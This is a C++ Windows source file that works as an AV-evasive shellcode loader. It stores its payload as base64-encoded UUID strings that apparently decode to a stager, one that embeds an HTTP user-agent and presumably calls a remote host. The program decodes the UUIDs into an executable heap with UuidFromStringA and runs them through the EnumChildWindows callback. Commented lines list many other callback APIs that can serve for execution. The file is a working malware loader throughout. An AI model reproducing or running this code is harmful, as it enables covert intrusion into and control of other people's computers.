#include <Windows.h>
#include <Rpc.h>
#include <iostream>
#pragma comment(lib, "Rpcrt4.lib")
#include "base64.h"


const string uuids_base64[] =
{
	"ZTQ4MzQ4ZmMtZThmMC0wMGM4LTAwMDAtNDE1MTQxNTA1MjUx", "ZDIzMTQ4NTYtNDg2NS01MjhiLTYwNDgtOGI1MjE4NDg4YjUy", "NzI4YjQ4MjAtNDg1MC1iNzBmLTRhNGEtNGQzMWM5NDgzMWMw", "N2M2MTNjYWMtMmMwMi00MTIwLWMxYzktMGQ0MTAxYzFlMmVk", "NDg1MTQxNTItNTI4Yi04YjIwLTQyM2MtNDgwMWQwNjY4MTc4", "NzUwMjBiMTgtOGI3Mi04ODgwLTAwMDAtMDA0ODg1YzA3NDY3", "NTBkMDAxNDgtNDg4Yi00NDE4LThiNDAtMjA0OTAxZDBlMzU2", "NDFjOWZmNDgtMzQ4Yi00ODg4LTAxZDYtNGQzMWM5NDgzMWMw", "YzljMTQxYWMtNDEwZC1jMTAxLTM4ZTAtNzVmMTRjMDM0YzI0", "ZDEzOTQ1MDgtZDg3NS00NDU4LThiNDAtMjQ0OTAxZDA2NjQx", "NDQ0ODBjOGItNDA4Yi00OTFjLTAxZDAtNDE4YjA0ODg0ODAx", "NDE1ODQxZDAtNWU1OC01YTU5LTQxNTgtNDE1OTQxNWE0ODgz", "NTI0MTIwZWMtZTBmZi00MTU4LTU5NWEtNDg4YjEyZTk0ZmZm", "NmE1ZGZmZmYtNDkwMC03N2JlLTY5NmUtNjk2ZTY1NzQwMDQx", "ZTY4OTQ5NTYtODk0Yy00MWYxLWJhNGMtNzcyNjA3ZmZkNTQ4", "MzE0OGM5MzEtNGRkMi1jMDMxLTRkMzEtYzk0MTUwNDE1MDQx", "Nzk1NjNhYmEtZmZhNy1lOWQ1LTkzMDAtMDAwMDVhNDg4OWMx", "MDFiYmI4NDEtMDAwMC0zMTRkLWM5NDEtNTE0MTUxNmEwMzQx", "NTdiYTQxNTEtOWY4OS1mZmM2LWQ1ZWItNzk1YjQ4ODljMTQ4", "ODk0OWQyMzEtNGRkOC1jOTMxLTUyNjgtMDAzMmMwODQ1MjUy", "NTVlYmJhNDEtM2IyZS1kNWZmLTQ4ODktYzY0ODgzYzM1MDZh", "ODk0ODVmMGEtYmFmMS0wMDFmLTAwMDAtNmEwMDY4ODAzMzAw", "ZTA4OTQ5MDAtYjk0MS0wMDA0LTAwMDAtNDFiYTc1NDY5ZTg2", "ODk0OGQ1ZmYtNDhmMS1kYTg5LTQ5YzctYzBmZmZmZmZmZjRk", "NTI1MmM5MzEtYmE0MS0wNjJkLTE4N2ItZmZkNTg1YzAwZjg1", "MDAwMDAxOWQtZmY0OC0wZmNmLTg0OGMtMDEwMDAwZWJiM2U5", "MDAwMDAxZTQtODJlOC1mZmZmLWZmMmYtNmM3YTM2NDEwMGY3", "OWM2ZDU5NjAtMDc3OC03ZjE0LTkwM2MtYjVmMmQxOTk5ZDkx", "NmVjNDY2YzItM2YxNy00M2I4LWIzZWUtNDUyOGVmOGZjZTdi", "MmM5MTA2NWItYTQyZS1lNzJhLTY4ZGUtYjlmMjgyZGVhZTll", "MzBmNWU3OTEtOWYzOC1lNDZiLTQwNWEtMDdiY2NmMTU5MTk5", "M2U5NDVmZTAtYTUwMC1mZDBmLTAwNTUtNzM2NTcyMmQ0MTY3", "M2E3NDZlNjUtNGQyMC03YTZmLTY5NmMtNmM2MTJmMzUyZTMw", "NmY2MzI4MjAtNzA2ZC03NDYxLTY5NjItNmM2NTNiMjA0ZDUz", "MzEyMDQ1NDktMmUzMC0zYjMwLTIwNTctNjk2ZTY0NmY3Nzcz", "MjA1NDRlMjAtMmUzNi0zYjMyLTIwNTctNjk2ZTM2MzQzYjIw", "M2IzNDM2NzgtNTQyMC02OTcyLTY0NjUtNmU3NDJmMzYyZTMw", "NDE0ZDIwM2ItNTI0MS01MzRhLTI5MGQtMGEwMDcxZTRmYmM0", "MzU2YWM2M2EtOTQwZS1kNGQ2LTM2NzgtZjc0OTlkNTUyNjk1", "MDVmYjQ2YWMtZjY2YS01YzU4LTlmMzEtOGJlZTQzMmVmOWYw", "NmE0ODZhOGMtZThmMC04ODg5LTE1MzItMTc2YmU1NTgwMWI3", "YzQ5NmIwNmMtNDk3Zi0zNDUxLTI4NWUtYjk5ODdjNGRiYTFj", "MjU0NTM1ZTItZGE3MS0xZjRiLTdmNjctYjc3ZDllYjBhODdm", "NWM4YWVkMGItYTkxMi01YTYyLTA5ODEtYjdiOTEwYjM4YmRk", "NjI2ZmU5OTgtYTkxZS0yZjg5LWZhOWYtMjY2NjE2YjEzYmQw", "YjEzMmMzYjAtMGRlMC1hM2Y5LTQxMDAtMjNkMDcxNzFjMDFh", "MDQ0MGYxNzMtYWUzYi0xNjU3LTdjNDItMGM0ODMxOTc2MDdh", "YzdjNTYwYWMtNjI4NS1iY2JhLWVmZmUtNjJhNDdkMGU3OTc1", "NmRiODQ3NGItNDg0Mi00YWRmLTMzNjQtZDA4NjNiMjliMTli", "YjY5YWRjZGUtMWNjYy1kZTM2LTUxMGMtNGZhNDgzODU4NWFm", "NTYxYzIzN2QtODZkYi05MWJlLTAwNDEtYmVmMGI1YTI1NmZm", "YzkzMTQ4ZDUtMDBiYS00MDAwLTAwNDEtYjgwMDEwMDAwMDQx", "MDAwMDQwYjktNDEwMC01OGJhLWE0NTMtZTVmZmQ1NDg5MzUz", "ZTc4OTQ4NTMtODk0OC00OGYxLTg5ZGEtNDFiODAwMjAwMDAw", "NDFmOTg5NDktMTJiYS04OTk2LWUyZmYtZDU0ODgzYzQyMDg1", "NjZiNjc0YzAtMDc4Yi0wMTQ4LWMzODUtYzA3NWQ3NTg1ODU4", "MDAwMDA1NDgtMDAwMC1jMzUwLWU4N2YtZmRmZmZmMzEyZTMx", "MzAzODJlMzUtMzEyZS0zMjMwLTAwNDktOTYwMmQyMDAwMDAw"
};


static const char encode_map[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static char decode_map[256];
static void initBase64DecodeMap()
{
    memset(decode_map, -1, sizeof(decode_map));
    for (int i = 'A'; i <= 'Z'; ++i) decode_map[i] = 0 + (i - 'A');
    for (int i = 'a'; i <= 'z'; ++i) decode_map[i] = 26 + (i - 'a');
    for (int i = '0'; i <= '9'; ++i) decode_map[i] = 52 + (i - '0');
    decode_map[(unsigned char)'+'] = 62;
    decode_map[(unsigned char)'/'] = 63;
    decode_map[(unsigned char)'='] = 0;
}


bool CBase64::Encode(const string& strIn, string& strOut)
{
	size_t nInLen = strIn.length();
	size_t numOrig24BitValues = nInLen / 3;
	bool havePadding = (nInLen != numOrig24BitValues * 3);
	bool havePadding2 = (nInLen == numOrig24BitValues * 3 + 1);
	size_t numResultBytes = 4 * (numOrig24BitValues + havePadding);
	strOut.clear();
	for (size_t i = 0; i < numOrig24BitValues; ++i)
	{
		strOut.append(1, encode_map[(strIn[3 * i] >> 2) & 0x3F]);
		strOut.append(1, encode_map[((strIn[3 * i] << 4) & 0x30) | ((strIn[3 * i + 1] >> 4) & 0x0F)]);
		strOut.append(1, encode_map[((strIn[3 * i + 1] << 2) & 0x3C) | ((strIn[3 * i + 2] >> 6) & 0x03)]);
		strOut.append(1, encode_map[strIn[3 * i + 2] & 0x3F]);

	}

	if (havePadding)
	{
		size_t i = numOrig24BitValues;
		strOut.append(1, encode_map[(strIn[3 * i] >> 2) & 0x3F]);
		if (havePadding2)
		{
			strOut.append(1, encode_map[((strIn[3 * i] << 4) & 0x30) | ((strIn[3 * i + 1] >> 4) & 0x0F)]);
			strOut.append(1, '=');
		}
		else
		{
			strOut.append(1, encode_map[((strIn[3 * i] << 4) & 0x30) | ((strIn[3 * i + 1] >> 4) & 0x0F)]);
			strOut.append(1, encode_map[((strIn[3 * i + 1] << 2) & 0x3C) | ((strIn[3 * i + 2] >> 6) & 0x03)]);
		}
		strOut.append(1, '=');
	}

	return true;
}


bool CBase64::Decode(const string& strIn, string& strOut, bool fCheckInputValid/* = false*/)
{
	size_t nInlen = strIn.length();
	if (nInlen < 4 || (nInlen % 4) != 0)
	{
		return false;
	}

	static bool bInit = false;
	if (!bInit)
	{
		initBase64DecodeMap();
		bInit = true;
	}

	if (fCheckInputValid)
	{
		for (size_t i = 0; i < nInlen; ++i)
		{
			if (decode_map[(unsigned char)strIn[i]] == -1)
			{
				return false;
			}
		}
	}
	size_t nOutLen = (nInlen * 3) / 4;
	string strTmpOut;
	strTmpOut.resize(nOutLen);
	size_t nLoopLen = nOutLen / 3;
	for (size_t i = 0; i < nLoopLen; ++i)
	{
		strTmpOut[i * 3] = ((decode_map[strIn[i * 4]] << 2) & 0xFC) | ((decode_map[strIn[i * 4 + 1]] >> 4) & 0x03);
		strTmpOut[i * 3 + 1] = ((decode_map[strIn[i * 4 + 1]] << 4) & 0xF0) | ((decode_map[strIn[i * 4 + 2]] >> 2) & 0x0F);
		strTmpOut[i * 3 + 2] = ((decode_map[strIn[i * 4 + 2]] << 6) & 0xC0) | (decode_map[strIn[i * 4 + 3]] & 0x3F);
	}

	if (strIn[nInlen - 1] == '=')
	{
		nOutLen--;
		if (strIn[nInlen - 2] == '=')
		{
			nOutLen--;
		}
	}
	const char* pData = strTmpOut.data();
	strOut.clear();
	strOut.append(pData, pData + nOutLen);
	return true;
}


int main()
{
	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//在进程的虚拟地址空间中保留空间
	void* ha = HeapAlloc(hc, 0, 0x100000);//申请内存
	DWORD_PTR hptr = (DWORD_PTR)ha;

	string tmp = "";
	int num = sizeof(uuids_base64) / sizeof(uuids_base64[0]);
	// char* uuids[num];
	for (int i = 0; i < num; i++) {
		CBase64::Decode(uuids_base64[i], tmp);
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)tmp.c_str(), (UUID*)hptr);//UUID转换为原来的shellcode写入内存
		if (status != RPC_S_OK) {
	        printf("UuidFromStringA() != S_OK\n");
	        CloseHandle(ha);
	        return -1;
	    }
	    hptr += 16;
	}
	printf("[*] Hexdump: ");
	for (int i = 0; i < num * 16; i++) {
	    printf("%02X ", ((unsigned char*)ha)[i]);
	}

	 EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
	 CloseHandle(ha);



	


    //HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);//在进程的虚拟地址空间中保留空间
    //void* ha = HeapAlloc(hc, 0, 0x100000);//申请内存
    //DWORD_PTR hptr = (DWORD_PTR)ha;
    //int elems = sizeof(uuids) / sizeof(uuids[0]);


    //for (int i = 0; i < elems; i++) {
    //    RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);//UUID转换为原来的shellcode写入内存
    //    if (status != RPC_S_OK) {
    //        printf("UuidFromStringA() != S_OK\n");
    //        CloseHandle(ha);
    //        return -1;
    //    }
    //    hptr += 16;
    //}

    //printf("[*] Hexdump: ");
    //for (int i = 0; i < elems * 16; i++) {
    //    printf("%02X ", ((unsigned char*)ha)[i]);
    //}
    // EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);//枚举操作系统上安装或支持的语言环境
    // EnumTimeFormatsA((TIMEFMT_ENUMPROCA)ha, 0, 0);
    // EnumWindows((WNDENUMPROC)ha, 0);
    // EnumDesktopWindows(NULL,(WNDENUMPROC)ha, 0);
    // EnumThreadWindows(0, (WNDENUMPROC)ha, 0);
    // EnumSystemGeoID(0, 0, (GEO_ENUMPROC)ha);
    // EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)ha, 0, 0);
    // EnumUILanguagesA((UILANGUAGE_ENUMPROCA)ha, 0, 0);
    // EnumSystemCodePagesA((CODEPAGE_ENUMPROCA)ha, 0);
    // EnumDesktopsW(NULL,(DESKTOPENUMPROCW)ha, NULL);
    // EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)ha, 0);
    // EnumDateFormatsA((DATEFMT_ENUMPROCA)ha, 0, 0);
    // EnumChildWindows(NULL, (WNDENUMPROC)ha, 0);
    // CloseHandle(ha);
    return 0;
}
